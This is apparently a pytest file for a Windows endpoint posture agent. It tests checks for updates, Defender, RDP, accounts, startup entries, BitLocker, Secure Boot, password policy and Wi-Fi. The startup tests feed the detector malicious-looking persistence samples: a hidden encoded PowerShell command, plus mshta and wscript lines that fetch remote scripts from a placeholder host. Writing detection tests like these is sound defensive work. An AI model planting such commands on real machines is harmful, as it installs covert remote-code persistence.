"""Windows posture checks against hand-written fixtures shaped like real output (not recordings)."""

from datetime import UTC, datetime, timedelta

import pytest
from sentinel_agent.checks.windows import accounts as acc
from sentinel_agent.checks.windows import bitlocker as bl
from sentinel_agent.checks.windows import defender as dfd
from sentinel_agent.checks.windows import hardening as hd
from sentinel_agent.checks.windows import network_profile as npf
from sentinel_agent.checks.windows import password_policy as pp
from sentinel_agent.checks.windows import rdp
from sentinel_agent.checks.windows import secureboot as sb
from sentinel_agent.checks.windows import startup as st
from sentinel_agent.checks.windows import updates as upd
from sentinel_agent.registry import CheckRegistry
from sentinel_agent.runner import build_plan
from sentinel_agent.testing import FixtureContext, ps_json, reg, windows_host
from sentinel_core.checks import NotApplicable, SkipCheck
from sentinel_core.models import AgentJob, FindingKind, PlanStatus, ScanType, Severity

HOME = windows_host(edition="Home", os_build="10.0.26300.7171", is_insider_build=True, hostname="RYAN-PC")
NOW = datetime(2026, 10, 25, 12, 0, tzinfo=UTC)


def rules(out):
    return sorted(f.rule_id for f in out.findings)


# --------------------------------------------------------------------------- win.os.updates


def _history(days_ago: float, title="2026-10 Cumulative Update for Windows 11 (KB5066835)", result=2, op=1):
    return {"Title": title, "Date": (NOW - timedelta(days=days_ago)).isoformat(), "ResultCode": result, "Operation": op}


def _updates(history, start="Manual"):
    return {"commands": {upd.UPDATE_HISTORY.name: ps_json({
        "CollectedAt": NOW.isoformat(), "TotalCount": len(history), "History": history,
        "WuauservStartType": start, "WuauservStatus": "Running"})}}


def test_updates_recent_install_passes_on_release_build():
    out = upd.WindowsUpdates().run(FixtureContext(windows_host(), _updates([_history(9)])))
    assert out.findings == []


def test_updates_stale_and_defender_definitions_do_not_count():
    hist = [_history(1, "Security Intelligence Update for Microsoft Defender Antivirus - KB2267602"),
            _history(50), _history(3, result=4)]
    out = upd.WindowsUpdates().run(FixtureContext(windows_host(), _updates(hist)))
    assert rules(out) == ["win.os.updates.stale"]
    assert out.findings[0].severity is Severity.MEDIUM


def test_updates_service_disabled_is_high_and_insider_is_informational():
    out = upd.WindowsUpdates().run(FixtureContext(HOME, _updates([_history(2)], start="Disabled")))
    by = {f.rule_id: f for f in out.findings}
    assert by["win.os.updates.service_disabled"].severity is Severity.HIGH
    insider = by["win.os.updates.insider_build"]
    assert insider.kind is FindingKind.INFORMATIONAL
    assert insider.title == "Insider build: Microsoft's monthly security guide does not map to this build"


def test_updates_single_history_entry_object_is_handled():
    fixture = _updates([])
    data = {"CollectedAt": NOW.isoformat(), "TotalCount": 1, "History": _history(4), "WuauservStartType": "Manual"}
    fixture["commands"][upd.UPDATE_HISTORY.name] = ps_json(data)
    assert upd.WindowsUpdates().run(FixtureContext(windows_host(), fixture)).findings == []


def test_updates_unreadable_history_skips():
    fixture = {"commands": {upd.UPDATE_HISTORY.name: ps_json({"CollectedAt": NOW.isoformat(),
                                                            "HistoryError": "Exception from HRESULT: 0x80240007",
                                                            "WuauservStartType": "Manual"})}}
    with pytest.raises(SkipCheck):
        upd.WindowsUpdates().run(FixtureContext(windows_host(), fixture))


# --------------------------------------------------------------------------- win.defender.status

DEFENDER_OK = {"AMServiceEnabled": True, "AntivirusEnabled": True, "RealTimeProtectionEnabled": True,
               "IsTamperProtected": True, "AntivirusSignatureAge": 0,
               "AntivirusSignatureLastUpdated": "2026-10-25T06:14:02.0000000Z", "AMRunningMode": "Normal"}
DEFENDER_SC = {"displayName": "Windows Defender", "productState": 397568}


def _defender(status=None, products=(DEFENDER_SC,), status_error=False):
    cmds = {dfd.AV_PRODUCTS.name: ps_json(list(products))}
    cmds[dfd.DEFENDER_STATUS.name] = {"error": "failed", "message": "Get-MpComputerStatus failed"} if status_error \
        else ps_json(status or DEFENDER_OK)
    return {"commands": cmds}


def test_defender_healthy_passes():
    assert dfd.DefenderStatus().run(FixtureContext(HOME, _defender())).findings == []


def test_defender_old_signatures_realtime_and_tamper():
    status = {**DEFENDER_OK, "AntivirusSignatureAge": 4, "RealTimeProtectionEnabled": False, "IsTamperProtected": False}
    out = dfd.DefenderStatus().run(FixtureContext(HOME, _defender(status)))
    sev = {f.rule_id: f.severity for f in out.findings}
    assert sev == {"win.defender.realtime_off": Severity.HIGH, "win.defender.signatures_old": Severity.MEDIUM,
                   "win.defender.tamper_off": Severity.MEDIUM}


def test_defender_disabled_without_other_av_is_critical():
    status = {**DEFENDER_OK, "AntivirusEnabled": False, "RealTimeProtectionEnabled": False}
    out = dfd.DefenderStatus().run(FixtureContext(HOME, _defender(status)))
    assert rules(out) == ["win.defender.av_disabled"]
    assert out.findings[0].severity is Severity.CRITICAL


def test_defender_passive_with_third_party_av_is_not_applicable():
    status = {**DEFENDER_OK, "AntivirusEnabled": False, "RealTimeProtectionEnabled": False,
              "AMRunningMode": "Passive Mode"}
    products = (dict(DEFENDER_SC, productState=393472), {"displayName": "Bitdefender Antivirus", "productState": 266240})
    with pytest.raises(NotApplicable, match="Bitdefender Antivirus"):
        dfd.DefenderStatus().run(FixtureContext(HOME, _defender(status, products)))


def test_defender_status_failure_skips():
    with pytest.raises(SkipCheck, match="Get-MpComputerStatus"):
        dfd.DefenderStatus().run(FixtureContext(HOME, _defender(status_error=True)))


# --------------------------------------------------------------------------- win.rdp


def test_rdp_not_applicable_on_home_edition():
    check = rdp.RemoteDesktop()
    assert check.applicable(HOME) == "Windows Home cannot host Remote Desktop connections"
    planned, _ = build_plan(CheckRegistry([rdp.RemoteDesktop]), AgentJob(scan_id=1, scan_type=ScanType.POSTURE), HOME)
    assert planned[0].status is PlanStatus.NOT_APPLICABLE


def _rdp(deny, nla, port=3389):
    return {"registry": {reg("HKLM", rdp.TS_KEY, "fDenyTSConnections", "64"): deny,
                         reg("HKLM", rdp.RDP_TCP_KEY, "UserAuthentication", "64"): nla,
                         reg("HKLM", rdp.RDP_TCP_KEY, "PortNumber", "64"): port}}


def test_rdp_without_nla_is_high_with_nla_low_and_off_passes():
    pro = windows_host(edition="Pro")
    assert rules(rdp.RemoteDesktop().run(FixtureContext(pro, _rdp(0, 0)))) == ["win.rdp.no_nla"]
    out = rdp.RemoteDesktop().run(FixtureContext(pro, _rdp(0, 1)))
    assert rules(out) == ["win.rdp.enabled_nla"] and out.findings[0].severity is Severity.LOW
    assert rdp.RemoteDesktop().run(FixtureContext(pro, _rdp(1, 1))).findings == []


# --------------------------------------------------------------------------- win.accounts

USERS = [
    {"Name": "Administrator", "Enabled": False, "PasswordRequired": True, "SID": "S-1-5-21-1-2-3-500"},
    {"Name": "Guest", "Enabled": False, "PasswordRequired": False, "SID": "S-1-5-21-1-2-3-501"},
    {"Name": "DefaultAccount", "Enabled": False, "PasswordRequired": False, "SID": "S-1-5-21-1-2-3-503"},
    {"Name": "Ryan", "Enabled": True, "PasswordRequired": True, "SID": "S-1-5-21-1-2-3-1001",
     "PrincipalSource": "MicrosoftAccount"},
]
ADMINS = [{"Name": "RYAN-PC\\Administrator", "ObjectClass": "User", "PrincipalSource": "Local",
           "SID": "S-1-5-21-1-2-3-500"},
          {"Name": "RYAN-PC\\Ryan", "ObjectClass": "User", "PrincipalSource": "MicrosoftAccount",
           "SID": "S-1-5-21-1-2-3-1001"}]


def _accounts(users=USERS, admins=None, fallback=None):
    cmds = {acc.LOCAL_USERS.name: ps_json({"Users": users, "CurrentUser": "RYAN-PC\\Ryan",
                                           "CurrentUserSid": "S-1-5-21-1-2-3-1001"})}
    cmds[acc.ADMIN_MEMBERS.name] = ps_json(admins if admins is not None else
                                           {"Method": "Get-LocalGroupMember", "Members": ADMINS})
    if fallback is not None:
        cmds[acc.ADMIN_MEMBERS_FALLBACK.name] = ps_json(fallback)
    return {"commands": cmds}


def test_accounts_clean_machine_only_notes_daily_admin():
    out = acc.LocalAccounts().run(FixtureContext(HOME, _accounts()))
    assert rules(out) == ["win.accounts.daily_admin"]
    assert out.findings[0].kind is FindingKind.INFORMATIONAL
    assert "separate standard account" in out.findings[0].remediation


def test_accounts_guest_builtin_admin_and_no_password():
    users = [dict(u) for u in USERS]
    users[0]["Enabled"] = True
    users[1]["Enabled"] = True
    users.append({"Name": "kid", "Enabled": True, "PasswordRequired": False, "SID": "S-1-5-21-1-2-3-1002"})
    out = acc.LocalAccounts().run(FixtureContext(HOME, _accounts(users)))
    sev = {f.rule_id: f.severity for f in out.findings}
    assert sev["win.accounts.guest_enabled"] is Severity.HIGH
    assert sev["win.accounts.builtin_admin_enabled"] is Severity.MEDIUM
    assert sev["win.accounts.password_not_required"] is Severity.MEDIUM
    # Guest has PasswordRequired false too, so both accounts are flagged
    assert sum(1 for f in out.findings if f.rule_id == "win.accounts.password_not_required") == 2


def test_accounts_many_admins_low():
    users = [*USERS, *({"Name": f"admin{i}", "Enabled": True, "PasswordRequired": True,
                        "SID": f"S-1-5-21-1-2-3-{1100 + i}"} for i in range(2))]
    admins = ADMINS + [{"Name": f"RYAN-PC\\admin{i}", "SID": f"S-1-5-21-1-2-3-{1100 + i}"} for i in range(2)]
    out = acc.LocalAccounts().run(FixtureContext(HOME, _accounts(users, {"Method": "x", "Members": admins})))
    assert "win.accounts.many_admins" in rules(out)


def test_accounts_get_localgroupmember_failure_uses_fallback():
    broken = {"Method": "Get-LocalGroupMember", "Error": "Failed to compare two elements in the array."}
    fallback = {"Method": "ADSI", "GroupName": "Administrators", "Members": [
        {"Name": "WinNT://RYAN-PC/Ryan", "ObjectClass": "User", "SID": "S-1-5-21-1-2-3-1001"},
        {"Name": "WinNT://S-1-12-1-111-222-333-444", "ObjectClass": "User", "SID": "S-1-12-1-111-222-333-444"}]}
    ctx = FixtureContext(HOME, _accounts(admins=broken, fallback=fallback))
    out = acc.LocalAccounts().run(ctx)
    assert [c[0] for c in ctx.calls] == [acc.LOCAL_USERS.name, acc.ADMIN_MEMBERS.name, acc.ADMIN_MEMBERS_FALLBACK.name]
    ev = out.evidence[0].content
    assert ev["enabled_local_administrators"] == ["Ryan"]
    assert ev["administrators_lookup"][acc.ADMIN_MEMBERS_FALLBACK.name] == {"method": "ADSI", "ok": True}
    assert "win.accounts.daily_admin" in rules(out)


def test_accounts_every_admin_method_fails_still_evaluates_users():
    users = [dict(u) for u in USERS]
    users[1]["Enabled"] = True
    broken = {"Method": "Get-LocalGroupMember", "Error": "An unspecified error occurred: error code = 1789"}
    fallback = {"Method": "CIM", "Error": "Invalid query", "AdsiError": "Access is denied."}
    out = acc.LocalAccounts().run(FixtureContext(HOME, _accounts(users, broken, fallback)))
    assert str(out.evidence[0].content["administrators"]).startswith("unavailable")
    assert "win.accounts.guest_enabled" in rules(out)
    assert "win.accounts.daily_admin" not in rules(out)  # unknown, so not claimed


# --------------------------------------------------------------------------- win.startup


@pytest.fixture
def startup_env(monkeypatch):
    monkeypatch.setenv("ProgramData", "C:\\ProgramData")
    monkeypatch.setenv("APPDATA", "C:\\Users\\Ryan\\AppData\\Roaming")
    return {
        "all": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp",
        "user": "C:\\Users\\Ryan\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
    }


def _startup(hkcu_run, folders):
    run, run_once = st.RUN_KEYS
    return {
        "registry": {
            reg("HKLM", run, "*", "64"): {"SecurityHealth": "%windir%\\system32\\SecurityHealthSystray.exe",
                                          "RtkAudUService": "\"C:\\Windows\\System32\\RtkAudUService64.exe\" -background"},
            reg("HKLM", run, "*", "32"): {},
            reg("HKCU", run, "*"): hkcu_run,
            reg("HKCU", run_once, "*"): {},
        },
        "files": {folder + "::<listdir>": "\n".join(names) for folder, names in folders.items()},
    }


def test_startup_normal_entries_pass(startup_env):
    fixture = _startup({"OneDrive": "\"C:\\Users\\Ryan\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background"},
                       {startup_env["user"]: ["desktop.ini", "Spotify.lnk"]})
    out = st.StartupPrograms().run(FixtureContext(HOME, fixture))
    assert out.findings == []
    names = {e["name"] for e in out.evidence[0].content["entries"]}
    assert names == {"SecurityHealth", "RtkAudUService", "OneDrive", "Spotify.lnk"}


def test_startup_temp_and_encoded_commands_are_heuristic(startup_env):
    fixture = _startup({
        "Updater": "C:\\Users\\Ryan\\AppData\\Local\\Temp\\svch0st.exe",
        "Helper": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
        "Hta": "mshta.exe https://example.invalid/a.hta",
    }, {startup_env["all"]: ["run.vbs"]})
    out = st.StartupPrograms().run(FixtureContext(HOME, fixture))
    assert len(out.findings) == 3
    assert {f.kind for f in out.findings} == {FindingKind.HEURISTIC}
    assert {f.severity for f in out.findings} == {Severity.MEDIUM}
    assert any("AppData\\Local\\Temp" in f.title for f in out.findings)


@pytest.mark.parametrize("command,flagged", [
    ("powershell -EncodedCommand AAAA", True),
    ("pwsh.exe -NoProfile -e AAAA", True),
    ("powershell.exe -ExecutionPolicy Bypass -File C:\\tools\\x.ps1", False),
    ("wscript.exe //B https://example.invalid/x.js", True),
    ("C:\\Users\\Public\\x.exe", True),
    ("C:\\Users\\Ryan\\Downloads\\setup.exe /S", True),
    ("\"C:\\Program Files\\Steam\\steam.exe\" -silent", False),
])
def test_startup_heuristics(command, flagged):
    assert (st.suspicious_reason(command) is not None) is flagged


# --------------------------------------------------------------------------- win.lsa_protection / win.smartscreen


def test_lsa_off_is_low():
    off = {"registry": {reg("HKLM", hd.LSA_KEY, "LsaCfgFlags", "64"): 0}}
    out = hd.LsaProtection().run(FixtureContext(HOME, off))
    assert rules(out) == ["win.lsa_protection.off"] and out.findings[0].severity is Severity.LOW
    assert out.evidence[0].content["LsaCfgFlags"] == 0


@pytest.mark.parametrize("value", [1, 2])
def test_lsa_on_passes(value):
    on = {"registry": {reg("HKLM", hd.LSA_KEY, "RunAsPPL", "64"): value}}
    assert hd.LsaProtection().run(FixtureContext(HOME, on)).findings == []


def test_smartscreen_default_passes():
    out = hd.SmartScreen().run(FixtureContext(HOME, {}))
    assert out.findings == []
    assert any("default" in n for n in out.evidence[0].content["notes"])


def test_smartscreen_off_by_setting_or_policy_is_medium():
    off = {"registry": {reg("HKLM", hd.EXPLORER_KEY, "SmartScreenEnabled", "64"): "Off"}}
    assert rules(hd.SmartScreen().run(FixtureContext(HOME, off))) == ["win.smartscreen.off"]
    policy = {"registry": {reg("HKLM", hd.SMARTSCREEN_POLICY_KEY, "EnableSmartScreen", "64"): 0}}
    assert rules(hd.SmartScreen().run(FixtureContext(HOME, policy))) == ["win.smartscreen.off"]


# --------------------------------------------------------------------------- win.bitlocker

MANAGE_BDE_OFF = """BitLocker Drive Encryption: Configuration Tool version 10.0.26300
Copyright (C) 2013 Microsoft Corporation. All rights reserved.

Volume C: [Windows]
[OS Volume]

    Size:                 475.83 GB
    BitLocker Version:    None
    Conversion Status:    Fully Decrypted
    Percentage Encrypted: 0.0%
    Encryption Method:    None
    Protection Status:    Protection Off
    Lock Status:          Unlocked
    Identification Field: None
    Key Protectors:       None Found
"""
MANAGE_BDE_ON = MANAGE_BDE_OFF.replace("BitLocker Version:    None", "BitLocker Version:    2.0").replace(
    "Fully Decrypted", "Used Space Only Encrypted").replace("0.0%", "100.0%").replace(
    "Encryption Method:    None", "Encryption Method:    XTS-AES 128").replace("Protection Off", "Protection On")
NO_MODULE = {"error": "failed", "message": "Get-BitLockerVolume : The term 'Get-BitLockerVolume' is not recognized"}


def test_bitlocker_volume_cmdlet_encrypted_passes():
    fixture = {"commands": {bl.BITLOCKER_VOLUME.name: ps_json({
        "MountPoint": "C:", "VolumeStatus": "FullyEncrypted", "ProtectionStatus": "On", "EncryptionPercentage": 100,
        "EncryptionMethod": "XtsAes128", "LockStatus": "Unlocked", "KeyProtector": ["Tpm", "RecoveryPassword"]})}}
    assert bl.BitLockerEncryption().run(FixtureContext(windows_host(is_elevated=True), fixture)).findings == []


def test_bitlocker_home_falls_back_to_manage_bde():
    host = HOME.model_copy(update={"is_elevated": True})
    ctx = FixtureContext(host, {"commands": {bl.BITLOCKER_VOLUME.name: NO_MODULE,
                                             bl.MANAGE_BDE.name: {"exit_code": 0, "stdout": MANAGE_BDE_OFF}}})
    out = bl.BitLockerEncryption().run(ctx)
    assert rules(out) == ["win.bitlocker.not_encrypted"]
    assert out.findings[0].severity is Severity.HIGH
    assert "Privacy & security > Device encryption" in out.findings[0].remediation
    assert out.evidence[0].source == "manage-bde -status C:"
    ok = FixtureContext(host, {"commands": {bl.BITLOCKER_VOLUME.name: NO_MODULE,
                                            bl.MANAGE_BDE.name: {"exit_code": 0, "stdout": MANAGE_BDE_ON}}})
    assert bl.BitLockerEncryption().run(ok).findings == []


def test_bitlocker_non_english_output_skips():
    german = "Konvertierungsstatus:     Vollständig entschlüsselt\nSchutzstatus:   Der Schutz ist deaktiviert.\n"
    ctx = FixtureContext(HOME, {"commands": {bl.BITLOCKER_VOLUME.name: NO_MODULE,
                                             bl.MANAGE_BDE.name: {"exit_code": 0, "stdout": german}}})
    with pytest.raises(SkipCheck, match="not recognised"):
        bl.BitLockerEncryption().run(ctx)


# --------------------------------------------------------------------------- win.secureboot


@pytest.mark.parametrize("state,expected", [("on", []), ("off", ["win.secureboot.off"]),
                                            ("unsupported", ["win.secureboot.unsupported"])])
def test_secureboot_states(state, expected):
    fixture = {"commands": {sb.SECURE_BOOT.name: ps_json({"state": state, "message": None})}}
    assert rules(sb.SecureBoot().run(FixtureContext(HOME, fixture))) == expected


def test_secureboot_inaccessible_skips():
    fixture = {"commands": {sb.SECURE_BOOT.name: ps_json({"state": "inaccessible", "message": "Access was denied"})}}
    with pytest.raises(SkipCheck):
        sb.SecureBoot().run(FixtureContext(HOME, fixture))


# --------------------------------------------------------------------------- win.password_policy

NET_ACCOUNTS = """Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    {threshold}
Lockout duration (minutes):                           10
Lockout observation window (minutes):                 10
Computer role:                                        WORKSTATION
The command completed successfully.
"""


def test_password_policy_no_lockout_is_low():
    fixture = {"commands": {pp.NET_ACCOUNTS.name: {"stdout": NET_ACCOUNTS.format(threshold="Never")}}}
    out = pp.PasswordPolicy().run(FixtureContext(HOME, fixture))
    assert rules(out) == ["win.password_policy.microsoft_account_note", "win.password_policy.no_lockout"]
    assert out.evidence[0].content["Minimum password length"] == "0"


def test_password_policy_lockout_set_passes_with_note_only():
    fixture = {"commands": {pp.NET_ACCOUNTS.name: {"stdout": NET_ACCOUNTS.format(threshold="10")}}}
    out = pp.PasswordPolicy().run(FixtureContext(HOME, fixture))
    assert [f.kind for f in out.findings] == [FindingKind.INFORMATIONAL]


def test_password_policy_non_english_skips():
    fixture = {"commands": {pp.NET_ACCOUNTS.name: {"stdout": "Kennwortlänge:   0\nSperrschwelle:   Nie\n"}}}
    with pytest.raises(SkipCheck, match="English"):
        pp.PasswordPolicy().run(FixtureContext(HOME, fixture))


# --------------------------------------------------------------------------- win.network_profile

WLAN = """
There is 1 interface on the system:

    Name                   : Wi-Fi
    Description            : Intel(R) Wi-Fi 6E AX211 160MHz
    GUID                   : 3c1b7e6a-0a52-4f43-9a0e-2a3b1e9d6f10
    Physical address       : a4:c3:f0:11:22:33
    Interface type         : Primary
    State                  : connected
    SSID                   : {ssid}
    AP BSSID               : 70:3a:cb:44:55:66
    Band                   : 5 GHz
    Channel                : 44
    Network type           : Infrastructure
    Radio type             : 802.11ax
    Authentication         : {auth}
    Cipher                 : {cipher}
    Connection mode        : Auto Connect
    Receive rate (Mbps)    : 1201
    Transmit rate (Mbps)   : 1201
    Signal                 : 92%
    Profile                : {ssid}
    QoS MSCS Configured         : 0

    Hosted network status  : Not available
"""
PROFILES = [{"Name": "HomeNet", "InterfaceAlias": "Wi-Fi", "NetworkCategory": "Private", "IPv4Connectivity": "Internet"}]


def _wifi(auth, cipher, ssid="HomeNet"):
    return {"commands": {npf.CONNECTION_PROFILES.name: ps_json(PROFILES),
                         npf.WLAN_INTERFACES.name: {"stdout": WLAN.format(ssid=ssid, auth=auth, cipher=cipher)}}}


def test_network_profile_wpa2_passes():
    out = npf.NetworkProfile().run(FixtureContext(HOME, _wifi("WPA2-Personal", "CCMP")))
    assert out.findings == []
    assert out.evidence[0].content["wifi"][0]["SSID"] == "HomeNet"


@pytest.mark.parametrize("auth,cipher,severity", [("Open", "None", Severity.HIGH), ("Open", "WEP", Severity.HIGH),
                                                  ("WPA2-Personal", "TKIP", Severity.MEDIUM),
                                                  ("WPA-Personal", "CCMP", Severity.MEDIUM)])
def test_network_profile_weak_wifi(auth, cipher, severity):
    out = npf.NetworkProfile().run(FixtureContext(HOME, _wifi(auth, cipher, "CoffeeShop")))
    assert rules(out) == ["win.network_profile.weak_wifi"]
    assert out.findings[0].severity is severity
    assert out.findings[0].subject_key == "wifi:CoffeeShop"


def test_network_profile_wlan_service_absent_means_no_wifi():
    fixture = {"commands": {npf.CONNECTION_PROFILES.name: ps_json(PROFILES[0]),
                            npf.WLAN_INTERFACES.name: {"exit_code": 1, "stdout": "The Wireless AutoConfig Service "
                                                       "(wlansvc) is not running.\n"}}}
    out = npf.NetworkProfile().run(FixtureContext(HOME, fixture))
    assert out.findings == []
    assert "wlansvc" in out.evidence[0].content["wifi_note"]
